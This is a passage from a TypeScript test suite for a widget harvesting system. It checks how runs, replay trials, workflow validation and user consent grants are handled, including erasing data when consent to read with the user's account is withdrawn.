    const slow = await prepare("lent", `export default () => new Promise(() => {});`);
    expect((await harvest(slow, { delayMs: 300 })).state).toMatchObject({ status: "error", error: "Délai dépassé", kernelError: true });
  });

  it("grant refused during the harvest, after the read with an account: nothing is written, accord-requis", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => { const p = await w.readPage("https://app.daily.dev/", { account: true }); await w.kev("x", {}); return p.text; };`,
      sources,
    );
    await writeData(ctx.widgetsFolder, "daily", { old: true });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    // What refuserAccord does: grant removed, data erased.
    const fake = {
      kev: async () => {
        await removeGrant(ctx.widgetsFolder, "daily");
        await deleteData(ctx.widgetsFolder, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await harvest(ctx, { bridge: bridge, ai: fake });
    expect(readCalls(bridge)).toHaveLength(1);
    expect(r.state).toMatchObject({ status: "grant-required", kernelError: true });
    expect(r.data).toBeUndefined();
    expect(existsSync(join(ctx.widgetsFolder, "daily", "data.json"))).toBe(false);
    expect((await readWidgetState(ctx.widgetsFolder, "daily")).status).toBe("grant-required");
    const home = await readHome(spacePaths(ctx.space), ctx.widgetsFolder);
    const parsed = home.widgets.find((w) => w.id === "daily")!;
    expect("data" in parsed && parsed.data).toBeNull(); // what widget_data would return
  });
});

describe("runHarvest, through the widget's workflow", () => {
  const sources = { account: ["app.daily.dev"], public: ["127.0.0.1"] };
  const dataOf = (ctx: Context) => join(ctx.widgetsFolder, ctx.widget.id);
  const runOf = async (ctx: Context, id: string | undefined) => {
    expect(id).toBeTruthy();
    return (await readRun(dataOf(ctx), id!))!;
  };
  /** Replaces harvest.mjs with a workflow.json (and its files). */
  async function toWorkflow(ctx: Context, workflow: unknown, files: Record<string, string> = {}) {
    await rm(join(ctx.widget.folder, "harvest.mjs"), { force: true });
    await writeFile(join(ctx.widget.folder, "workflow.json"), typeof workflow === "string" ? workflow : JSON.stringify(workflow));
    for (const [name, text] of Object.entries(files)) await writeFile(join(ctx.widget.folder, name), text);
  }
  const NEW = {
    version: 1,
    blocks: [
      { id: "liste", type: "code", params: { source: "liste.mjs" } },
      { id: "nouveaux", type: "list.new", params: { key: "id" } },
      { id: "sortie", type: "output", params: { to: "widget" } },
    ],
    links: [{ from: "liste", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }],
  };
  /** An old run and a memory, to check that they leave with the data. */
  async function traces(ctx: Context) {
    const old: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", owner: { type: "widget", id: ctx.widget.id }, trigger: "scheduled",
      start: "2026-10-27T08:00:00.000Z", end: "2026-10-27T08:00:01.000Z", status: "succeeded", blocks: [],
    };
    await writeRun(dataOf(ctx), old);
    await writeMemory(dataOf(ctx), { newItems: { type: "list.new", value: ["secret"] } });
  }

  it("a widget with only harvest.mjs and an account runs as before: same data, same log, implicit run harvest → output", async () => {
    const ctx = await prepare(
      "gmail",
      `export default async (w) => {
        const p = await w.readPage("https://app.daily.dev/", { account: true });
        w.log("courriels lus");
        return { text: p.text, prev: w.previous, cfg: w.config, when: w.now };
      };`,
      sources,
    );
    await writeData(ctx.widgetsFolder, "gmail", { old: true });
    await giveGrant(ctx.widgetsFolder, "gmail", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    const expected = { text: "articles", prev: { old: true }, cfg: { a: 1 }, when: NOW.toISOString() };
    expect(r.state).toMatchObject({ status: "ok", lastUpdate: NOW.toISOString() });
    expect(r.data).toEqual(expected);
    expect(await readJson(join(ctx.widgetsFolder, "gmail", "data.json"))).toEqual(expected);
    const state = await readWidgetState(ctx.widgetsFolder, "gmail");
    expect(state.status).toBe("ok");
    expect(state.log).toContain("courriels lus");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profile: "perso", domains: ["app.daily.dev"], localAddresses: true }]);
    const e = await runOf(ctx, r.run);
    expect(e).toMatchObject({ status: "succeeded", trigger: "scheduled", owner: { type: "widget", id: "gmail" }, start: NOW.toISOString() });
    expect(e.blocks.map((b) => [b.id, b.type, b.status])).toEqual([["harvest", "code", "succeeded"], ["output", "output", "succeeded"]]);
    expect(e.blocks[0]!.log).toContain("courriels lus");
    // An error thrown by this widget stays its own: never marked as the kernel's.
    await writeFile(join(ctx.widget.folder, "harvest.mjs"), `export default async () => { throw new Error("Délai dépassé"); };`);
    const failure = await harvest(ctx);
    expect(failure.state).toMatchObject({ status: "error", error: "Délai dépassé" });
    expect(failure.state.kernelError).toBeUndefined();
    expect(await readJson(join(ctx.widgetsFolder, "gmail", "data.json"))).toEqual(expected);
    expect((await runOf(ctx, failure.run)).status).toBe("failed");
  });

  it("a workflow widget writes data, run and memory; the next harvest receives the memory", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const r1 = await harvest(ctx);
    expect(r1.state.status).toBe("ok");
    expect(r1.data).toEqual([{ id: 1 }, { id: 2 }]);
    expect(await readJson(join(ctx.widgetsFolder, "flux", "data.json"))).toEqual([{ id: 1 }, { id: 2 }]);
    expect((await readMemory(dataOf(ctx))).nouveaux?.type).toBe("list.new");
    const e = await runOf(ctx, r1.run);
    expect(e.blocks.map((b) => [b.id, b.status, b.items])).toEqual([["liste", "succeeded", 2], ["nouveaux", "succeeded", 2], ["sortie", "succeeded", 2]]);
    await writeFile(join(ctx.widget.folder, "liste.mjs"), `export default async () => [{ id: 2 }, { id: 3 }];`);
    const r2 = await harvest(ctx);
    expect(r2.data).toEqual([{ id: 3 }]);
  });

  it("a run's memory is written under the widget's memory lock (the builder's erase lock)", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    let release!: () => void;
    const held = withMemory(dataOf(ctx), () => new Promise<void>((r) => (release = r)));
    let finished = false;
    const r = harvest(ctx).then((x) => ((finished = true), x));
    const data = join(dataOf(ctx), "data.json");
    for (let i = 0; i < 200 && !existsSync(data); i++) await new Promise((t) => setTimeout(t, 25));
    expect(existsSync(data)).toBe(true);
    await new Promise((t) => setTimeout(t, 100));
    expect(finished).toBe(false);
    expect(existsSync(join(dataOf(ctx), "memory.json"))).toBe(false);
    release();
    await held;
    expect((await r).state.status).toBe("ok");
    expect((await readMemory(dataOf(ctx))).nouveaux?.type).toBe("list.new");
  });

  it("an invalid workflow.json: error state « Workflow invalide : … » marked erreurNoyau, data kept, no container launched, failed run written", async () => {
    for (const workflow of ['{"version":1,"blocs":[', { version: 1, blocks: [{ id: "x", type: "inconnu" }] }]) {
      const ctx = await prepare("casse", "");
      await toWorkflow(ctx, workflow);
      await writeData(ctx.widgetsFolder, "casse", { old: true });
      const r = await harvest(ctx);
      expect(r.state.status).toBe("error");
      expect(r.state.error).toMatch(/^Workflow invalide : /);
      expect(r.state.kernelError).toBe(true);
      expect(kernelError(r.state.error!)).toBe(true);
      expect(ctx.commands).toHaveLength(0);
      expect(await readJson(join(ctx.widgetsFolder, "casse", "data.json"))).toEqual({ old: true });
      const e = await runOf(ctx, r.run);
      expect(e).toMatchObject({ status: "failed", kernelError: true, blocks: [] });
      expect(e.error).toBe(r.state.error);
    }
  });

  it("the workflow is validated according to the widget: budgetSeconds 600 refused without a maximum duration, accepted with maxDurationMinutes 30", async () => {
    const LONG = {
      version: 1,
      blocks: [
        { id: "liste", type: "code", params: { source: "liste.mjs" } },
        { id: "page", type: "source.page", params: { url: "https://app.daily.dev/", perItem: true, budgetSeconds: 600 } },
        { id: "sortie", type: "output", params: { to: "widget" } },
      ],
      links: [{ from: "liste", to: "page" }, { from: "page", to: "sortie" }],
    };
    const files = { "liste.mjs": "export default () => [{ id: 1 }];" };
    const short = await prepare("court", "");
    await toWorkflow(short, LONG, files);
    const deny = await harvest(short, { bridge: readBridge() });
    expect(deny.state.error).toBe("Workflow invalide : page.budgetSeconds : 170 au plus");
    expect(short.commands).toHaveLength(0);

    const long = await prepare("long", "");
    long.widget.declaration.harvest = { minutes: 60, maxDurationMinutes: 30 };
    await toWorkflow(long, LONG, files);
    const r = await harvest(long, { bridge: readBridge() });
    expect(long.commands).toHaveLength(1);
    expect(r.state.status).toBe("ok");
  });

  it("grant removed during the run: no data, no run, no memory on disk at the end", async () => {
    const ctx = await prepare("daily", "", sources);
    await toWorkflow(ctx, NEW, {
      "liste.mjs": `export default async (e, w) => [{ id: (await w.readPage("https://app.daily.dev/", { account: true })).text }];`,
    });
    await writeData(ctx.widgetsFolder, "daily", { old: true });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const read = bridge.readPageInvisible!.bind(bridge);
    // What refuserAccord does, during the read: the page read still reaches the widget.
    bridge.readPageInvisible = async (...a: Parameters<typeof read>) => {
      await removeGrant(ctx.widgetsFolder, "daily");
      await deleteData(ctx.widgetsFolder, "daily");
      return read(...a);
    };
    const r = await harvest(ctx, { bridge: bridge });
    expect(readCalls(bridge)).toHaveLength(1);
    expect(r.state).toMatchObject({ status: "grant-required", kernelError: true });
    expect(r.data).toBeUndefined();
    expect(r.run).toBeUndefined();
    expect(existsSync(join(ctx.widgetsFolder, "daily", "data.json"))).toBe(false);
    expect(existsSync(join(ctx.widgetsFolder, "daily", "memory.json"))).toBe(false);
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect((await readWidgetState(ctx.widgetsFolder, "daily")).status).toBe("grant-required");
  });

  it("profile refused: data, runs and memory erased", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { secret: "du compte" });
    await traces(ctx);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "prive" });
    const r = await harvest(ctx, { bridge: readBridge(["prive"]) });
    expect(r.state).toMatchObject({ status: "grant-required", error: PROFILE_DENIED("fr"), kernelError: true });
    expect(await readGrants(ctx.widgetsFolder)).toEqual({});
    expect(existsSync(join(ctx.widgetsFolder, "daily", "data.json"))).toBe(false);
    expect(existsSync(join(ctx.widgetsFolder, "daily", "memory.json"))).toBe(false);
    expect(await listRuns(dataOf(ctx))).toEqual([]);
  });

  it("stale grant (declaration changed): runs and memory erased along with the data", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { secret: "du compte" });
    await traces(ctx);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev", "ancien.dev"], public: ["127.0.0.1"], profile: "perso" });
    const r = await harvest(ctx);
    expect(r.state.status).toBe("grant-required");
    expect(existsSync(join(ctx.widgetsFolder, "daily", "data.json"))).toBe(false);
    expect(existsSync(join(ctx.widgetsFolder, "daily", "memory.json"))).toBe(false);
    // Only the « accord requis » run of this time remains.
    expect((await listRuns(dataOf(ctx))).map((e) => [e.id, e.status])).toEqual([[r.run, "grant-required"]]);
  });

  it("without a grant: accord-requis run, no block launched", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    const r = await harvest(ctx);
    expect(r.state).toMatchObject({ status: "grant-required", error: "Accord requis pour lire avec ton compte : app.daily.dev", kernelError: true });
    expect(ctx.commands).toHaveLength(0);
    const e = await runOf(ctx, r.run);
    expect(e).toMatchObject({ status: "grant-required", kernelError: true, error: r.state.error });
    expect(e.blocks.map((b) => [b.id, b.status])).toEqual([["harvest", "not-run"], ["output", "not-run"]]);
  });

  it("without a grant, again: no new accord-requis run, the last one stands in", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    const first = await harvest(ctx);
    // An hour later: without the rule, a second run (other id) would be written.
    const later = () => new Date(NOW.getTime() + 3_600_000);
    const second = await runHarvest({ ...optionsOf(ctx), clock: later });
    expect(second.state.status).toBe("grant-required");
    expect(second.run).toBe(first.run);
    expect((await listRuns(dataOf(ctx))).map((e) => e.status)).toEqual(["grant-required"]);
  });

  it("the run carries the requested trigger", async () => {
    const ctx = await prepare("meteo", `export default async () => 1;`);
    const r = await runHarvest({ ...optionsOf(ctx), trigger: "agent" });
    expect((await runOf(ctx, r.run)).trigger).toBe("agent");
    const m = await runHarvest({ ...optionsOf(ctx), trigger: "manual" });
    expect((await runOf(ctx, m.run)).trigger).toBe("manual");
  });

  it("interrupted at the end: interrupted run", async () => {
    const ctx = await prepare("lent", `export default () => new Promise(() => {});`);
    const r = await runHarvest({ ...optionsOf(ctx), delayMs: 300, interrupted: () => true });
    const e = await runOf(ctx, r.run);
    // The message is the kernel's (not « Délai dépassé »); the started block is interrupted, the output never launched.
    expect(e).toMatchObject({ status: "interrupted", error: "Interrompue : Ressac s'est arrêté", kernelError: true });
    expect(e.blocks.map((b) => [b.id, b.status])).toEqual([["harvest", "interrupted"], ["output", "not-run"]]);
    expect(kernelError(e.error!)).toBe(true);
  });
});

describe("runAttempt", () => {
  const sources = { account: ["app.daily.dev"], public: ["127.0.0.1"] };
  const dataOf = (ctx: Context) => join(ctx.widgetsFolder, ctx.widget.id);
  async function toWorkflow(ctx: Context, workflow: unknown, files: Record<string, string> = {}) {
    await rm(join(ctx.widget.folder, "harvest.mjs"), { force: true });
    await writeFile(join(ctx.widget.folder, "workflow.json"), JSON.stringify(workflow));
    for (const [name, text] of Object.entries(files)) await writeFile(join(ctx.widget.folder, name), text);
  }
  const NEW = {
    version: 1,
    blocks: [
      { id: "liste", type: "code", params: { source: "liste.mjs" } },
      { id: "nouveaux", type: "list.new", params: { key: "id" } },
      { id: "sortie", type: "output", params: { to: "widget" } },
    ],
    links: [{ from: "liste", to: "nouveaux" }, { from: "nouveaux", to: "sortie" }],
  };
  /** Content and modification date of the files kept outside the space (absent: null). */
  const snapshot = async (ctx: Context) => {
    const r: Record<string, { text: string; mtime: number } | null> = {};
    for (const name of ["data.json", "memory.json", "state.json"]) {
      const path = join(dataOf(ctx), name);
      r[name] = existsSync(path) ? { text: await readFile(path, "utf8"), mtime: (await stat(path)).mtimeMs } : null;
    }
    return r;
  };
  const attempt = (ctx: Context, origin: string, start: string, o: Partial<Parameters<typeof runAttempt>[0]> = {}) =>
    runAttempt({ ...optionsOf(ctx), origin: origin, start: start, ...o });

  it("a trial writes a -attempt run with depart and origine, and touches neither data, memory nor state", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const real = await runHarvest(optionsOf(ctx));
    expect(real.state.status).toBe("ok");
    expect((await readMemory(dataOf(ctx))).nouveaux).toBeDefined();
    const before = await snapshot(ctx);
    expect(Object.values(before).every((f) => f !== null)).toBe(true);
    // The list is not rerun: its output is taken from the original run.
    await writeFile(join(ctx.widget.folder, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const traces: unknown[] = [];
    const r = await attempt(ctx, real.run!, "nouveaux", { onTrace: (t) => traces.push(t) });
    expect(r).toEqual({ ok: true, run: attemptId(NOW.toISOString()), status: "succeeded" });
    const e = (await readRun(dataOf(ctx), (r as { run: string }).run))!;
    expect(e).toMatchObject({ trigger: "replay", attempt: { start: "nouveaux", origin: real.run }, status: "succeeded" });
    expect(e.blocks.map((b) => [b.id, b.status, b.items])).toEqual([["liste", "resumed", 2], ["nouveaux", "succeeded", 2], ["sortie", "succeeded", 2]]);
    expect(traces).toEqual([
      { block: "nouveaux", step: "start" },
      { block: "nouveaux", step: "end", status: "succeeded", items: 2 },
      { block: "sortie", step: "start" },
      { block: "sortie", step: "end", status: "succeeded", items: 2 },
    ]);
    expect(await snapshot(ctx)).toEqual(before);
    // The real run is still there, next to the trial.
    expect((await listRuns(dataOf(ctx))).map((x) => x.id).sort()).toEqual([real.run, e.id].sort());
  });

  it("rejouer twice from the same block: the second trial starts from the first and takes the outputs of the real run", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }, { id: 2 }];` });
    const real = await runHarvest(optionsOf(ctx));
    await writeFile(join(ctx.widget.folder, "liste.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const first = await attempt(ctx, real.run!, "nouveaux");
    if (!first.ok) throw new Error(first.error);
    const later = new Date(NOW.getTime() + 60_000);
    const second = await attempt(ctx, first.run, "nouveaux", { clock: () => later });
    expect(second).toEqual({ ok: true, run: attemptId(later.toISOString()), status: "succeeded" });
    const e = (await readRun(dataOf(ctx), attemptId(later.toISOString())))!;
    // The named origin is the one the reused output comes from: the real run.
    expect(e.attempt).toEqual({ start: "nouveaux", origin: real.run });
    expect(e.blocks.map((b) => [b.id, b.status, b.items])).toEqual([["liste", "resumed", 2], ["nouveaux", "succeeded", 2], ["sortie", "succeeded", 2]]);
    // Real run pruned: the refusal stays that of a missing output.
    await rm(join(dataOf(ctx), "runs", `${real.run}.json`));
    expect(await attempt(ctx, first.run, "nouveaux", { clock: () => new Date(later.getTime() + 60_000) })).toEqual({
      ok: false, error: "Rejeu impossible : la sortie de « liste » manque dans cette exécution",
    });
  });

  it("a failing trial writes no error in the widget's state", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const real = await runHarvest(optionsOf(ctx));
    const before = await snapshot(ctx);
    await writeFile(join(ctx.widget.folder, "liste.mjs"), `export default async () => { throw new Error("boum"); };`);
    const r = await attempt(ctx, real.run!, "liste");
    expect(r).toMatchObject({ ok: true, status: "failed" });
    expect(await snapshot(ctx)).toEqual(before);
    const state = await readWidgetState(ctx.widgetsFolder, "flux");
    expect(state.status).toBe("ok");
    expect(state.error).toBeUndefined();
  });

  it("trial of a widget with an account without a grant: refused with the grant message, no container, nothing written", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    const r = await attempt(ctx, "2026-10-27T08-00-00-000Z", "harvest");
    expect(r).toEqual({ ok: false, error: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commands).toHaveLength(0);
    expect(existsSync(dataOf(ctx))).toBe(false);
  });

  it("grant removed during the trial: no run on disk", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => { const p = await w.readPage("https://app.daily.dev/", { account: true }); await w.kev("x", {}); return p.text; };`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const fake = { kev: async () => ({}), gemma: async () => "" };
    const real = await runHarvest({ ...optionsOf(ctx), ai: fake });
    expect(real.state.status).toBe("ok");
    // What refuserAccord does, during the trial.
    const remove = {
      kev: async () => {
        await removeGrant(ctx.widgetsFolder, "daily");
        await deleteData(ctx.widgetsFolder, "daily");
        return {};
      },
      gemma: async () => "",
    };
    const r = await attempt(ctx, real.run!, "harvest", { ai: remove });
    expect(r).toEqual({ ok: false, error: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect(existsSync(join(dataOf(ctx), "data.json"))).toBe(false);
  });

  it("trial refused by the replay plan: exact message, no container launched", async () => {
    const ctx = await prepare("flux", "");
    await toWorkflow(ctx, NEW, { "liste.mjs": `export default async () => [{ id: 1 }];` });
    const real = await runHarvest(optionsOf(ctx));
    const launched = ctx.commands.length;
    const before = await snapshot(ctx);
    expect(await attempt(ctx, real.run!, "absent")).toEqual({ ok: false, error: "Rejeu impossible : le bloc « absent » n'est pas dans le workflow" });
    expect(await attempt(ctx, "2020-01-01T00-00-00-000Z", "liste")).toEqual({ ok: false, error: "Rejeu impossible : exécution introuvable" });
    expect(ctx.commands).toHaveLength(launched);
    expect(await snapshot(ctx)).toEqual(before);
    expect(await listRuns(dataOf(ctx))).toHaveLength(1);
  });

  it("trial whose reused outputs and previous one exceed 4 MB: refused, no container, nothing written", async () => {
    const ctx = await prepare("gros", "");
    const upstream = Array.from({ length: 10 }, (_, i) => `a${i}`);
    await toWorkflow(ctx, {
      version: 1,
      blocks: [
        ...upstream.map((id) => ({ id, type: "code", params: { source: "a.mjs" } })),
        { id: "tout", type: "code", params: { source: "a.mjs" } },
        { id: "sortie", type: "output", params: { to: "widget" } },
      ],
      links: [...upstream.map((from) => ({ from: from, to: "tout" })), { from: "tout", to: "sortie" }],
    }, { "a.mjs": `export default async () => 1;` });
    await writeData(ctx.widgetsFolder, "gros", "x".repeat(1_900_000));
    const origin: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", owner: { type: "widget", id: "gros" }, trigger: "scheduled",
      start: "2026-10-27T08:00:00.000Z", end: "2026-10-27T08:00:01.000Z", status: "succeeded",
      blocks: upstream.map((id) => ({ id, type: "code", status: "succeeded" as const, start: null, end: null, items: null, output: "y".repeat(240_000), log: [] })),
    };
    await writeRun(dataOf(ctx), origin);
    const r = await attempt(ctx, origin.id, "tout");
    expect(r).toEqual({ ok: false, error: "Rejeu impossible : les sorties à reprendre dépassent 4 Mo" });
    expect(ctx.commands).toHaveLength(0);
    expect((await listRuns(dataOf(ctx))).map((e) => e.id)).toEqual([origin.id]);
  });

  it("a widget without workflow.json (harvest.mjs alone): rejouer from the output takes the harvest output", async () => {
    const ctx = await prepare("gmail", `export default async (w) => ({ text: (await w.readPage("https://app.daily.dev/", { account: true })).text });`, sources);
    await giveGrant(ctx.widgetsFolder, "gmail", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const real = await runHarvest({ ...optionsOf(ctx), bridge: bridge });
    expect(real.state.status).toBe("ok");
    const before = await snapshot(ctx);
    await writeFile(join(ctx.widget.folder, "harvest.mjs"), `export default async () => { throw new Error("relancée"); };`);
    const r = await attempt(ctx, real.run!, "output", { bridge: bridge });
    expect(r).toMatchObject({ ok: true, status: "succeeded" });
    const e = (await readRun(dataOf(ctx), (r as { run: string }).run))!;
    expect(e.blocks.map((b) => [b.id, b.status])).toEqual([["harvest", "resumed"], ["output", "succeeded"]]);
    expect(readCalls(bridge)).toHaveLength(1);
    expect(await snapshot(ctx)).toEqual(before);
    expect(existsSync(join(ctx.widget.folder, "workflow.json"))).toBe(false);
  });

  it("stale grant at the start of a trial: grant removed, data erased, state accord-requis reported, no container", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { secret: "du compte" });
    const state = { status: "ok" as const, lastUpdate: "2026-10-27T08:00:00.000Z", lastAttempt: "2026-10-27T08:00:00.000Z" };
    await writeWidgetState(ctx.widgetsFolder, "daily", state);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev", "ancien.dev"], public: ["127.0.0.1"], profile: "perso" });
    const onChange = vi.fn();
    const r = await attempt(ctx, "2026-10-27T08-00-00-000Z", "harvest", { onChange: onChange });
    expect(r).toEqual({ ok: false, error: "Accord requis pour lire avec ton compte : app.daily.dev" });
    expect(ctx.commands).toHaveLength(0);
    expect(await readGrants(ctx.widgetsFolder)).toEqual({});
    expect(existsSync(join(dataOf(ctx), "data.json"))).toBe(false);
    expect(await readWidgetState(ctx.widgetsFolder, "daily")).toEqual({
      ...state,
      status: "grant-required",
      error: "Accord requis pour lire avec ton compte : app.daily.dev",
      kernelError: true,
    });
    expect(onChange).toHaveBeenCalled();
  });

  it("profile refused during the trial: no run, grant removed, state accord-requis", async () => {
    const ctx = await prepare("daily", `export default async (w) => (await w.readPage("https://app.daily.dev/", { account: true })).text;`, sources);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const real = await runHarvest(optionsOf(ctx));
    expect(real.state.status).toBe("ok");
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "prive" });
    const onChange = vi.fn();
    const r = await attempt(ctx, real.run!, "harvest", { bridge: readBridge(["prive"]), onChange: onChange });
    expect(r).toEqual({ ok: false, error: PROFILE_DENIED("fr") });
    expect(await listRuns(dataOf(ctx))).toEqual([]);
    expect(await readGrants(ctx.widgetsFolder)).toEqual({});
    expect(existsSync(join(dataOf(ctx), "data.json"))).toBe(false);
    expect(await readWidgetState(ctx.widgetsFolder, "daily")).toMatchObject({
      status: "grant-required",
      error: PROFILE_DENIED("fr"),
      kernelError: true,
      lastUpdate: real.state.lastUpdate,
      lastAttempt: real.state.lastAttempt,
    });
    expect(onChange).toHaveBeenCalled();
  });

  it("interrupted during the trial: -attempt run interrupted, neither data, memory nor state touched", async () => {
    const ctx = await prepare("lent", `export default () => new Promise(() => {});`);
    await writeData(ctx.widgetsFolder, "lent", { old: true });
    await writeWidgetState(ctx.widgetsFolder, "lent", { status: "ok", lastUpdate: "2026-10-27T08:00:00.000Z", lastAttempt: "2026-10-27T08:00:00.000Z" });
    const origin: Execution = {
      version: 1, id: "2026-10-27T08-00-00-000Z", owner: { type: "widget", id: "lent" }, trigger: "scheduled",
      start: "2026-10-27T08:00:00.000Z", end: "2026-10-27T08:00:01.000Z", status: "succeeded", blocks: [],
    };
    await writeRun(dataOf(ctx), origin);
    const before = await snapshot(ctx);
    const r = await attempt(ctx, origin.id, "harvest", { delayMs: 300, interrupted: () => true });
    expect(r).toEqual({ ok: true, run: attemptId(NOW.toISOString()), status: "interrupted" });
    const e = (await readRun(dataOf(ctx), attemptId(NOW.toISOString())))!;
    expect(e).toMatchObject({ status: "interrupted", error: "Interrompue : Ressac s'est arrêté", kernelError: true });
    expect(e.blocks.map((b) => [b.id, b.status])).toEqual([["harvest", "interrupted"], ["output", "not-run"]]);
    expect(await snapshot(ctx)).toEqual(before);
  });

  it("without a grant: a more recent trial does not prevent the last accord-requis run from standing in", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    const first = await runHarvest(optionsOf(ctx));
    expect(first.state.status).toBe("grant-required");
    const attemptWritten: Execution = {
      version: 1, id: "2026-10-28T11-00-00-000Z-attempt", owner: { type: "widget", id: "daily" }, trigger: "replay",
      attempt: { start: "harvest", origin: first.run! },
      start: "2026-10-28T11:00:00.000Z", end: "2026-10-28T11:00:01.000Z", status: "failed", blocks: [],
    };
    await writeRun(dataOf(ctx), attemptWritten);
    const later = () => new Date(NOW.getTime() + 2 * 3_600_000);
    const second = await runHarvest({ ...optionsOf(ctx), clock: later });
    expect(second.run).toBe(first.run);
    expect((await listRuns(dataOf(ctx))).filter((e) => !e.attempt)).toHaveLength(1);
  });
});

describe("runHarvest, watch (publications as it goes, memory kept, novelties)", () => {
  const dataOf = (ctx: Context) => join(ctx.widgetsFolder, ctx.widget.id);
  const dataFile = (ctx: Context) => join(dataOf(ctx), "data.json");
  const memoryFile = (ctx: Context) => join(dataOf(ctx), "memory.json");
  /** list (code) → record (source.recuperer per element) → output. */
  const watch = (o: { live?: boolean } = {}) => ({
    version: 1,
    blocks: [
      { id: "liste", type: "code", params: { source: "liste.mjs" } },
      { id: "fiche", type: "source.fetch", params: { url: "{url}", perItem: true } },
      { id: "sortie", type: "output", params: { to: "widget", ...(o.live ? { live: true } : {}) } },
    ],
    links: [{ from: "liste", to: "fiche" }, { from: "fiche", to: "sortie" }],
  });
  async function inWatch(ctx: Context, o: { live?: boolean; maxDurationMinutes?: number } = {}) {
    await rm(join(ctx.widget.folder, "harvest.mjs"), { force: true });
    await writeFile(join(ctx.widget.folder, "workflow.json"), JSON.stringify(watch(o)));
    await writeFile(join(ctx.widget.folder, "liste.mjs"), "export default () => [];");
    if (o.maxDurationMinutes !== undefined) ctx.widget.declaration.harvest = { minutes: 60, maxDurationMinutes: o.maxDurationMinutes };
  }

  /**
   * A fake container that writes its lines one by one; a function (possibly async) is called instead
   * of a line. `recu`: what the kernel writes to it; `bloque`: it never exits on its own (only killed).
   */
  const launcherSteps = (ctx: Context, step: unknown[], o: { received?: string[]; blocked?: boolean } = {}): ProcessLauncher => (cmd, args) => {
    ctx.commands.push([cmd, ...args]);
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.received?.push(d.toString()));
    let kill = () => {};
    const end = new Promise<number | null>((ok) => {
      kill = () => ok(null);
      void (async () => {
        for (const p of step) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") await p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.blocked) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })().catch(() => {
        // A probe failed: the container stops right away (the test fails on what the probe did not see).
        stdout.end();
        stderr.end();
        ok(1);
      });
    });
    return { stdin, stdout, stderr, kill: () => kill(), end: end };
  };

  /** A clock that the steps make advance. */
  const movableClock = () => {
    let t = NOW.getTime();
    return { clock: () => new Date(t), forward: (ms: number) => () => void (t += ms) };
  };
  const blockStart = (id: string) => ({ t: "block", id, step: "start" });
  const blockEnd = (id: string, output: unknown) => ({ t: "block", id, step: "end", status: "succeeded", output: output });
  const pub = (data: unknown, done: number, total: number) => ({ t: "publication", data: data, done: done, total });
  const mem = (value: unknown) => ({ t: "memory", memory: { liste: { type: "code", value: value } } });
  const A1 = { url: "https://a.example/1" };
  const A2 = { url: "https://a.example/2" };
  const A3 = { url: "https://a.example/3" };
  /** The start of a watch() run up to the opening of the chain (record). */
